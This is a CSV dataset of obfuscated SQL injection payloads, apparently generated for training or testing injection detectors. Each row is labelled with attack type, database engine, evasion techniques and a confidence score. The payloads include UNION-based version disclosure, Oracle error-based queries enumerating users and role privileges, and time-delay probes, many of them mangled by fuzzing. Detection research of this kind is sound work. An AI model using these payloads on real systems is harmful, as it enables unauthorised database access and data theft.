payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"SELEcT * FrOM UsErS wherE Id *=* '1' Or&\<0B0O10 Or 0X8 lIKe? 7x1 OR """".`k"" Not liKe """".`k"" >aND (seleCT 6067) not lIKe (SElect (SELECT 2068)) OR (SELecT 0x1871) NOt!LiKE=0x1AC9 aNd, true oR (SELECT 0) AND (sELECt 0b10x1) aND TrUE or (SElECt (SELECT 2)) -- 1'n<",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"SElect * FROm uSeRs WHeRE%iD LIKE[ 0X0 or $ 7B0X1 =?(sElEcT (sEleCT (SELECT (seLeCT (SeLECt (SELECT 8)))))) Union selecT 0x0b1,@@VeRSiON OR ""p"" not^LiKe ""P"" oR|(seLeCt;0x0O2) ANd 'P' LiKe 'P' Or fALsE Or "" "" Not = "" "" -- 7B131",union_based,mssql,case_variation|function_alternative,0.41,rule,sqliv5_json,string_double_quote
"~selEct *?FRoM/**/Users/*p( sk&P*/WherE^iD lIke '2'~<@._ UnIoN SELecT (selECt (select!(SELECT (SELECT 6)))),vERSiOn~,(] ) ? ^AND 0x1 OR False --#1'1B e",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SelEct * frOm""Users wHerE ID = '1' Or \.<$ Union SElecT (sElect (SELect (SELECT 2))),@@verSioN aND true aND 'g`' NOT LIKE 'g`*' Or false Or 0 oR FALse AND True -- 1'{",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"and(seLect (sElect 0x0o0o0x0B1004))=UtL_Inaddr.gEt_HoST_ADDrESs ( * (* selEct dIStINct <(+ usERNAME )? fROm ` (; select DIstINcT ( UsernAME :) , rownUm&AS LIMIT frOM Sys.alL_Users ); whEre liMIt lIke 4X4o6o6x7X8 ) ) And>'i' ?LIKE 'i",error_based,oracle,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
/ && 2o4o0X2B8b0b0x0X3b3O0B0O3O5X9B0o0x0o6O8O7/ LiKe/*)y*pyY */ Utl_InaDDr.Get_HOst_AdDReSs +;( ?}( sELEct+COuNt ](++diStINct /*:uH}o*(sELEct 0O5)gBp */( graNteD_rOLE + ) `) fROM DBA_ROLe_PRiVS wHere grAnTee lIKE& syS.LogiN_USeR& ) ) );? AND'I' liKE 'i,unknown,oracle,case_variation|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"?sEleCT}* FROm USers wHeRe ID=(SELEcT 0x1) OR="". AND ""B"" LiKe ""B"" or FALSe#"" oR (seleCT (SELECT 9)) = (sELeCT (SELECT 4)) -- 1'j",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"{sElEct * FRom userS where id =[ 0o0x5 oR (sELEcT (selecT (SELECt}1))) OR (SELECT 143) NOt LIke (SELEcT 0X35f) OR (sElECt 4) OR[0o5012 NOt Like 0x463 or 0O0X4 Or falsE AnD ""HT"" LIKE ""ht"" OR 0O0 or (SeLeCT 0) oR%""u{""=""U{k"" OR false#""@ uNIon SelEct (selECT (selECt 6X1)),VeRSioN ( ) -- 0O10+Xy",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"selEct *|fROM USeRS WhERe Id = 1 oR ""%5o7""*oR (SELECT 2) = (SElECt 1) or ""x"" NoT LIKe ""X"" OR False -- 0b2",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"sELEct *\froM/*IBzyzsn!g*/uSerS WHERe ID=0o1 Or;\.<\(unIOn]SelECT 3B1,@@VErSIOn AND ""tO."" _NOt] LIke ""TO.U"" or (SELECT (sELECT 8577)) NoT lIke (sElEct (SELEct 0X20c5)) and TruE && ""2t,""=""2t,"" OR False -->0X1x.P<",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"SeLeCt@* fROM!UsErs WHeRe/*[=(SeLeCT (SeLECT 0x4))?<LA*/id = '7' oR \<$+uNIoN SeLeCt%5X0,@@VERSIon+and True anD~ ""cKW"" nOT LikE ""ckw/"" aNd TRuE Or 0X62E Not=LIkE (sELect (SeLecT (SELEcT 2542))) anD tRUe oR 0x3 OR False -- 0'^",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
";[iF nOT+ ( SubStRINg ;*( ?)( <select @@VeRsIon ) ,5x9o23,(SELeCT[(SelEct=(sELECt 1))) ) Not LIKe (sEleCT 0x0o0) )= wAITfor<dELAY/**/'0:0b0x0:0o7' )oR {""NT"" nOt lIKe ""NT"" anD True OR falSE AND (SELECT (SELECT 4))>OR 0b0 OR 'u'!='u' AND True --",unknown,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,string_single_quote
"selecT&* froM UserS]WHERe id lIke;(sELect 0x0) or!2X1 aND TRUE *AnD (sElEct.(SELECT 0)) OR}False&&True OR ""f"" LIKE ""fM""#""2^UNIoN SeLecT VerSiON ( < )/*Z0x0o0b11?*/ ,vERsioN ( . ) ' --(5'cwm4S7",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"select * FrOM/* C !*/UsErs WHeRE Id =/**/ 5x0x0o7< oR ""; }) "" = (sElECT (SeLECT (sEleCT (SELECT 1)))) OR (sEleCT 9)\ LIkE? 0O4+aND "";"" like "";"" Or ""_ Q"" not LiKE ""_ q"" -- 2|ReU|%n",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"sELEcT * FrOm USErS WHerE iD; lIKe 5X4)OR ( 0x8b0O0O1 ) Like (sEleCt (SelEct (SeLEcT (sElect (SElect (SELECT (SELECT 1))))))) unION sELeCT 4x9,banneR FRoM V$veRSion wHErE rowNuM = 0X0B1 oR 9X0o0 or]'""D>u=' NoT%LikE '""d>U=' or (seLecT (seleCt 0x0)) anD '?C' noT lIke '?cm' aND trUe OR ""NzM"" nOT LIKe ""NZm"" and True/ aND TRUe and tRuE OR (SELeCT 1954) nOT LikE 1954 and 0o1 --{0X1`+5MZ`",union_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"selECT * froM USeRS whEre ID = @0x4^oR ""{{"" Or/*Wf*/0O2o2 = (SEleCT (sELEct (sElECt 1))) OR fALsE aNd trUE anD trUE or 'al',not lIkE 'al' OR False AND True -- 0X0o1X@Q",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"SeLECT * fROM UseRS whErE ID %= '3' or \<\. UNiON seLEct (sELeCT (SelECT (SeleCT (SELeCT 0X1)))),@@VERsION and 0X0B1140100110101~NoT=(SEleCt (SELEct (SELeCT 4x180a))) [AnD 'Z1' not = 'Z0O3G' AND='^(SeLeCT (SElEct 7X0)){' nOt LikE '^0X0o0B0|u' OR falSe aNd TRue oR False -- 0o3'ju>uS",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_single_quote
"seLeCT * frOM USerS wherE ID LIKE '0' or ) ( (SELECT (SELECT (SELECT 1))) ) ; = 9 unION seLECt (SELECT 1),bANNer FRoM v$VErSIOn WHErE ROWNUM +LiKE 1 AnD ""DX"" LIKe,""dx"" && True --`1'",union_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
";sELeCt * fRoM""usErS whERE Id likE (SElect\0O0B1) OR ""\ AND (SElECt (seLEcT (sELECt 5243))) <>`4909 aNd True)or ""h+$W"" nOt LiKe ""H+$W"" oR 0#"" or (sELeCT 1) LiKe (seLEcT 0X7) --/*iGf?(*/2o1!SsYI",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"sElect * FroM uSERS/*Re*/whErE Id' liKe] 0O0x7 Or)""_{""!Or;8x0B110x5=0x6O7b5x1<ANd TrUE OR (sELEct 9X0) [ && ""9"" NOT LIKE ""78"" And/**/%trUE:Or faLsE AND (SELECT (SELECT (SELECT (SELECT 1)))) AND True -- 0b0b10011101111110DRNKS}",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"+ And (sELEcT (seLEct (SelEct (seLect (seLECt 0X8))))) ?= uTl_inADdr.GeT_HOSt_aDdReSS ( (' seLECt disTinCT ( gRANted_role ) FRom ( sELECT?DisTINcT ( grAnTED_rOlE= ) , roWnuM AS lImIT FROM DbA_RoLe_Privs:whERE gRanteE <lIKe SYs.lOGinuSEr ) Where LiMIt=0B9o7O8x6x8O5 )"" ); &&'I' LIKE 'i",error_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"selEct * From UsErS WHerE/*w0o2lFa:M?*/iD;=~(seLEct (SELEct 0X3)) <@0B0X1$ oR 0X1|= 0X1{oR faLse>And 'v~' Not lIke 'v~f' and ""2O2""<>""2=""AnDtrue -- 6Ewm",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"8 ) } As ClYe}WherE (SeLEcT 0O0X1ea2) like 0x0X0x0X0B1Ea1 AnD+chAr[ ( 0b1101101 ) oR ChAr ( 0x5F ) OR cHAR ( <0X0o44 ) Or ChAR ( (seLeCt 0B2B11110111100011111010) ) LikE; rEGeXp_SUbStRinG ( REpEaT_^( $rigHt ( CHAR ( `0X1104 ) >,4O0 ) !,0o45301391000. ) ,NULL ) aNd<(sELECT 0x6O0X1).AnD trUE oR* FAlse And,true And (selECT 0x0x1) anD (sElect (sELEct (select!0b0x1602))) NoT lIKe 0x15F9 And (seleCT (seLeCt (seLeCT (seLect (SElEct (selecT (SELEct (sELecT 1)))))))) or (SeLECt 0X0) OR falSE and TruE AnD TRue --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0o0B21X0o4B1""~ ))/ and? ( [0b0x154C [=| (SElECt 0O15136)} ) *(SELeCt;(sElECT (SELeCT (SELECT 2056)))) anD| ((? ""CIYC""] lIKe ""Ciyc",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0X0B1' or ( %sELECT 'RAwn' FRoM dUaL WheRe (SElECT 4981)<= (SElEct 0x231C) OR chAR ( (SeLEct (Select}(seLeCt 0O104))) ) ? OR cHaR (@ (seleCT (seleCT 0x3e)) ) or ChAr ( (SelecT (sELecT%(seLeCt (SELECT 37)))) ) Or cHAR|*( 0x2x41) ) LIKe ReGeXP_SUbsTRING) ( REPeAT ( RIghT (? CHAr ( 4o0o81415 )> ,0x0 ) %,0x12A05F0O310 ) !,nulL ) ), ) ~OR '",unknown,oracle,case_variation|function_alternative|hex_string,0.06,rule,sqliv5_json,unknown
"0O0b0'$ ). %WhErE 0b0B0X9B0o1D=0B0X1024d64cd15\anD%0O9o13631 %=. dbmS_PiPe.RECEiVE_mEsSaGe+&(? ChR ^({ 7b0o0b1080X0B0X4c/* XIAN?BU6FL*/$)` ?OR ChR, ( 0O0b0B15101001] )/*y]+Cla:;v1p2 jTe*/ ;or*CHr <( 0B0b1101125x45. )@ Or\ Chr ~( +(sElEcT (seLEct (SeLEct 0x43)))! )& ,2x3X5\()^ANd(seleCt<0o0b10x1) &&/*p5I tUX<*/'b{or p'>LIKE 'b/ Or p' AnD true`aNd~TRuE^--",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"1' ) ) ) OR eXp ( ~ ( SELect * FRom- ( seLect cOnCAt ( 0o0X0B0B10010101001110100101001011011001011111111100000111100011100110100111100010A1B1000111, ( SeleCt ( {ELt? (^ 0o14140 LIKe 0b0O3b11011101100000,2X1 ;~) )* ]) ,0O0X0o0X717A0o1377a71,0x0X4e ) ) x* ) )/ AND : _( & ( ( 'fBsI' LikE 'fBSI",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"caLL rEgExP_SubStrIng, ( rEpeaT ( leFT ( crypT_kEY ( chAr ( 0b0o0b0o1x22bfabb ) OR CHaR! ( (SELECT (SELECT 0x3e)) ) . oR CHaR? ( 2x3f ) ,Null ) ,(sElect (SELECT (SELECT (SELECT (SELECT 0)))))$ ) ,0X1DCd5500 ) ),NULL ) and, ( ( ""PAwH"" = ""paWH",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"5"", ) ANd~(SELEcT?(SEleCt 0xeF0))=BenChMark^ ( 0o0o8x35fa57f,Md0b0X0O0O0b101 ( 0x5X4905d4a} `);./*B:j0o3^ e(*/ ):] &&, ( ""JOzH"" LIkE ""JozH",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"7%'` );^ ~) ; ) [ OR ` exP ( ~;<( SelEct * fRoM (![seLEcT coNCaT `( 0O9x0X6D6Eaca31, ( SEleCt (> ElT `( (SeLecT(0X9xBbE)=(sELecT (SEleCT 0X187e)),0B2O5X1 ]), ) > )`/*j NoT LIkE NG4?[*/,0X0b1011011111a0x2EbA0O3x0X0o0O2f,0B9x5X4E ) ~) {X { ) ) \And ( ; ( }( '%' LIke '",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"5$ ); | )\' OR sLEEP (/*v5\t?tPG^;12GX RFWmyFDU&;`=zg9!*/ 0x0O9 ) oR 0x108 <> 2x109 or fAlSe aND 0X3dd=(SelEct 4x3dD)}ANd ""<"" not liKe ""<~"" oR FaLSE or False or FalsE~AnD TruE or_fAlse or (sELECt (sELeCT 0))#9J\.N Knl",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.05,rule,sqliv5_json,string_single_quote
"8"" WherE 8x0x60C) LiKe<$ 2x0X1596 aND (SeleCt 0B102010001100) LiKe $(= seLeCt cOUNT ( * ) From sYSuSeRS as\sYS1,SYsusErS*as Sys3,sYSusers.AS syS0O0B0,sySUSeRS AS sYS0B0X4,SYsusers As syS5,sYSuSERS AS.SyS6,SysUSERs AS sYs2'<)` oR 3x0x0O0x0B8051 oR /**/FALSe[oR (SelecT (seLeCT (selECt (SeLECT?1016))))!lIke""(sELeCt (SElecT (SeleCt (seLEct`(SeLeCt (sEleCt 1015)))))) Or ""LE"" NOT like ""le"" && ""4"" lIKE ""4"" or FAlsE`or FaLSE && tRUE oR ""zlq"" lIKE ""ZLqu"" && trUe or fAlSE OR FaLSe anD '['}not' LiKe '[4' anD+TRUE/**/oR fAlSe or FalsE Or fAlsE AnD (SELECT 1)# AND ; (sEleCt (seLeCT (seLECt 1))) --L4Mi\rI",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"SeLEct Like ;( 'ABCdefG',uppEr ( Hex; (+ RaNDOmBLoB ( +0O0B18010100041860110001810111011015/(selEct (SElEcT 0b11X0X2)) )( ) ;) `![)/*!B*/ anD (? (| ( 'MFiB' lIke 'MfIB",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,unknown
"4%' And (SELECT[4595) Like (SeLecT (SELecT (SeLECt (SELECT 5595))));OR ""g"" LIkE ""gK""` OR 6#5'WV6H",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"0O9 () \aND cHaR (,^(seLeCt 8B1121518) ){ oR+ CHaR ( |2X0o2X4d ) or chAR (> (SeLect 0x67) .)! or chaR ( <(SelEct (SeleCT 0X58)) ) =| ReGexp_sUbsTRing (] RePEaT (;=LeFt ( cRYPt_kEY!}(\'char;/*?*/( (seLECt 0x91) ) oR Char ( ;(seLECT (sElecT 0X2a)) Or FALse And TRuE#) +oR : ChAr ( =0o0x6x5B110104 ) ,NuLL{ ) ,0o0o12? ) ,0X8O0O1DcD0O22474 ) ,nULl)>). and: (!((sELEct:(SelECT (sELecT (selecT!0x22de)))) LIkE 5x3X16E1 hkt",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"{ENd And} : ( !/*?A or: FaLSE aNd(trUe $oR FAlse oR 0B0x0 Or FalSe oR (SELECT (SELECT 0)) or FAlse AnD '<x'='<X' OR False#*/ ( *""rQay"":lIke ""Rqayy2zpFyK@P",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"selECt ( case^wHeN ( =(seleCT 0x1769) = 0b0x8x228e :) tHen (SeLeCT (SelecT(0x8321)) elSE 0X0X911* ( SelEcT (SeLEct (SEleCt (sElECt (SElecT (seLect (SELECT 6973)))))) FrOM MysQL.db ) eNd ) or ""0O1x0N""=""0Ng"" ,AND ""H"" NOT LIKE ""h)"" anD trUE oR 'xPi OR ""sNO""<>""Sno"" anD TrUe or FaLsE OR False#' nOt Like 'Xpi#'#rah",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,string_single_quote
"cAlL ReGEXP_subSTRINg ( /**/RePEat }( righT ( cHar ( 0B0b1100111100100000110100100100001011110 )/**/ ,0x0x4 ) ,(Select 0x1Dcd6500) ) &,nuLl ;) &&- ( /**/ ( >0x0b1100110E=0b1000001100000",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"3' ) ! as RVcH wheRe 0O0o3x0o20E0b111< = :(SElECt (seleCt (selECt (SELeCt (SElEcT (Select (seLECt (SELECT 1863)))))))) OR 0O29302 liKe ;LIke ( 'Abcdefg',uPper ;(; Hex( ( RanDoMBlOb ( (SeLeCT 0X0b1dcdB320)/0b0b0x0x0o4 ) ) . ^ ).? )] OR '~np' LikE '~NP{' aNd tRUE And ""M"" LikE ""M""&&tRUe AnD%3X1 anD TRuE --",time_blind,sqlite,case_variation|function_alternative|scientific_notation,0.47,rule,sqliv5_json,unknown
"0B0o0O1 AnD@(SelEcT 0X0o0B0O50502) /*(seLecT (sElect (SElEcT (sElEct 3)))) Kwd(?*/likE / ( ^sELECt couNT= ( * \) frOm;dOMain.dOMAINS.aS t1,domaiN.cOLUMNs_As T2,DOMaIN.taBLES[AS T0o8 ) oR 'F~' NOT LIKE 'F~' OR@FaLsE OR 0 Or FaLSe&&True -- loaoE;~6",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"8o2B0X79x0b10"" ) ) / /*&$lp{:)zuP+0Ywo8B*/UNION All sElEct nuLL,NuLL,nuLl,NUll,NULL,NuLL,NuLL,nuLl. ~ANd ""I"" NOT LIKE ""i^"" oR /*guB)*/falSE Or FALse oR (sELecT (SelEcT (sELECT (sELEcT (SELECT:(SELECT (SELECT (SELECT 0)))))))) oR FalsE AND True OR False AND True#mJIh]Dr",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"0B0B1%' )/*S(kL;+(seLecT 3),lyFCaOMr""SOw?b!o*/ ) ~[ ANd`cHAr, (< (sELect 615) ) , oR ChaR ( 0x0X4F ) ?or char ( 5B1009173 ;) ; OR cHAr ( 0O133& ) / LiKe REgExP_substRInG (? REPeAt =( <RiGhT ( CHAr% ( 0X1394 ) ,(seleCt (SElECt (selEcT (select (sELEcT 0))))) &) ,(sElEcT 0X92a0x5f600) ) ,null <) AnD\0B3 ANd?tRuE && (SelecT 1) aNd tRUE oR 'j+S'='j+sV' And ""cf"" not liKE ""CFp"" and true --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"1' ) WHere 0x32fF=(SELEcT (SELect (sELeCt (SELect 0xfE3)))) RLike+ ( SElecT }( ?case wHen ( 0b0X0x1e6 =LIkE (SElecT^(SElECT 0x3X1E32))/ ) THeN (SELECT 0O0B1) elsE 0X0X0b1c enD]|<) )} && (SElect (SElecT (sElECt (SEleCT (SELECT 1))))) And 0X0o1 AnD*""P 3H"" NOT liKe """"P 0x0b11Ha"" And TRUe --",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O7'~Or 2xA0X3d >=> Dbms_PIPe.ReCeIvE_MESsAge '( cHR ( (select=0xa8) ) or cHR ( &3x2B0b1b601001[ ) /*l<w0b1154abu*]:fId+d~lCJ ]9s */ Or + Chr{ (' 0x31[ )% ,or:cHR /( (SeleCt (Select (seleCT (sELEcT (SelECt (SeLecT (SELECT (SELECT (SELECT 0x6d))))))))) ) ,0x0X0B3o5 ) && 'xMNd' LIKE 'XmNd",unknown,oracle,case_variation|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"1' ) ) ) && rOw ( (SelecT 6237),(SELect 0x1D0b10D) ) > (' SElEct cOUnt ( * ) ,CoNCAT ( 0X0X6D8e79A0O0B1101011, ( SelECT ( ELt ( /**/0X185D LIKE 0x185d,(SELeCT?(Select 1)) ) ^ ) ) ,0X717A6x2FfA71,FLo Or ( *raND ( 4x0 )/n(S;I!@p(=q_2(A*/H*/ *(SeLEct (sElECT (SeleCt 0X2))) ` ) ) x fROM ( SELECT (SeLeCt 5292) UNion SElEcT (SElect (seLect 3785)) union seLeCt (sElEcT (sElEcT 3961)) UnIOn sElECt (sEleCt (SElEcT 7958)) ) @A GrOup bY x ) and < ( (\ =( 'eJUl' lIkE 'ejul",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"0B10"" @) ) `/*<~]NA5G!]*/aNd elt;+( 0XC2A => (sELect 0xc0b3o0b10A),sLEEp ?( 0X5\.%) ?-) ^/ Or ""Q""~nOt likE ""Q""\and trUe AnD 0b111001000[IN (6b111011011,(seLECt (sEleCt (SelEcT 0x1Dc))),0o0B0x69eaa61) oR ""`fJs""<>""`fJs"" OR FAlse and:True Or False or FaLSe oR false oR FaLsE oR FalsE AND trUE or false AND True#Fk`""XlrS^+i",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1"" ) wHEre>0X1a0F likE (SElECt 0X1A6o0F)|Or CHAR ( 0O0x77 ) % or cHAR ( 5X64} ) or ChaR (|>0x63 ) $ oR CHAR\ (! (Select (SeLEct+(SeleCt (sElEct 0x79)))) ;) / '= (REGExp_SuBsTRiNg ( !repEaT :( rIgHT> ( $ChAr& ( (SELECT (selEcT 3X5A0B100)) ) ,0B0 ) ,(SELEct 0O0xA8660577C) }) ,NuLl \) oR>""g"" LikE ""Gw"" AnD 'aPq9'<>'APQ1h'} OR ""kr;"" NoT lIke ""kR;"" AND True AnD\TrUe && True {&& (SEleCT (SElEct (SElECT (SELECT 1)))) or (SElecT`(SeLEcT 2)) aNd TrUe or faLse oR faLSe AND tRUE aNd ""2 y"" NOT lIKE ""7 ye"" AnD TRuE oR FaLSE --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"CAll REGeXP_SUBsTring ( rEPeAT ( rIght<%( ChAr %( (SELeCT 0O0B111001110110) ) ,(SeleCT (SelEct (SELECT 9)))* ) "",0o0X23C34645 ) ,NuLl ) ) && | ( ( ""eevK""/]LikE ""EEvk",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"SelEct;pg_sleep/*d(}{(SELECT 8)?(0%G*/?(]&(seleCt 0o0o0B110b5O2X3O6o7) )~~ And, )( ( 'ENpN'$LikE 'enpN",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0B0B0x3X1""$/) WHerE (selEcT (SELeCT 0O9XAB0o6))=(seLeCt 0B0B8O0x85b) OR<0x0X2d0b1000110 likE { * &(. sELECt COunT }(, *; ) FRom RdB$FieLDS aS T7,rdb$tYpEs As T0o0x3O0o0o0O1,rdb$coLLATiOns aS t6,Rdb$fuNCTIons AS T0b100 &) ! or^ (sElECT 0x8x0) && TruE or FalSE Or FAlSe And oR ""r"" noT LiKE ""r"" OR fAlse OR 0#0X105 <> (seLeCt (sELEct (SEleCT (SELECT (SELECT (SELECT 262)))))) OR (sELeCT 0X1C4F){Not lIKE (SELEct (seLECT (SELect 0X1C4F))) --",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"8B3B0x1' ) wherE 0x1B93 liKE (SElECt,(SELEcT[(sELeCT (SElect (SElECT 0O11025))))) rLIkE ( sElECT * froM ( SELeCt ( +slEeP ( 0o7 ) ) \ )* VWYQ ) && ',' not lIkE ',M' ANd tRuE&&""2|""/*%)spsPPeFL?*/likE ""5|"" anD "" ""<>"" B"" OR (SELECT (SELECT 0)) AND (SELECT (SELECT 1)) OR False AND True#) ]i:P",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.05,rule,sqliv5_json,string_double_quote
"7%' or 0xA0o143 lIKe dbMs_PipE.ReCEive_MESsaGE ( Chr ([ 0X9e ) "" OR^chR* ( (SeLEcT 0o0X65) ) or chr ( 2O2O0b15011001 ), || ChR (~ (SeleCT{(SEleCT (seLeCt (selecT (sEleCT (SElecT (SELECT 103))))))) ) ,(SeLEcT (SeLECT 0X6)) ) < aND '%' liKe '",time_blind,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"0O0X1' oR ( SeLect 'bnAZ' FrOm duAL wHerE (selEcT or falSE OR faLSE Or (SElect (seleCT 0X0)) oR ""k""=""k1"" or faLse or FaLsE OR False#(SeLeCT (sELeCt (SELEcT 0X0b1B9c))))+= 0o0o15273_AnD 8xA7c lIKe $ /*(SELEct (sElEcT (SeleCT 0x6)))|\}V};T|Gg */( seleCt coUNT (-'* ) FRoM sYSuseRS aS SYS6,sySUSERS,AS syS7B1028,sysUsErs as SYS1,SySuSers as sYS4,SySuSerS As sYS5,SYSusers As sys5,SySUSERs As sys0B11 ,) or (fALse && tRUE$ANd 0o0 || fALSe Or+FALse and_9 or~fALSE aND (Select?8X1) Or ""E"" like~""e:"" && (sEleCT (sElECt (SeleCT 0X1))) oR (sEleCT 0xA50) NOt LIKE` (seLECT 0Xa55) OR ""s<:2"" nOT!LIke ""s<:7"" AND 0X1 --(SeLEct (seleCt 7)){J5",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,string_double_quote
"0O0o6%"" ) $) anD (seLecT (SELECT 7533)) =; (SELECt (SELECT (SELECT 9167))) AnD? (; ( ; ""%"" LIKE """,unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"5%' ) ) ~ ) oR rOw ( 0x415,0x0b1D8A ) > ( (selEct COuNt ( * ) ,CONCaT ( 2o5X7911506a8x47, ( sElecT ( Elt ( (sElect{0X415) ~LIke 0X415,0o2x1 ) ) ) ,0X717a718a6O0X47,FlOoR ( RaND ( (selECT (sELect (SEleCT (SELECt (sELeCt (SELECT (SELEcT (SElECt (SELECT 0))))))))) $) *0x1 )[ ) X from. ( SElect 0x2128 UNioN seleCt 3X05D0 uNIOn}SelEcT (seLEcT (SelECT (seLeCt 0o3011))) UNiON SELECT 0X6bA ) A gROup BY x ) aND ( <(~ ( '%' Like '",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0b0b1' In BoOLeAN mOdE ) Or (seLEct (SELECT 1421)) = ( SeLECt cOunt ( * ) fRoM gENEraTe_sErIEs){( 0X1,0x4C4252 ( ) )/ ! oR$(Select 1047)<>(SeLeCt (selEcT 2047)) or ""!"" nOT!lIKE ""!"" oR (SELeCT 0)#",unknown,postgresql,case_variation|function_alternative|hex_string,0.06,rule,sqliv5_json,unknown
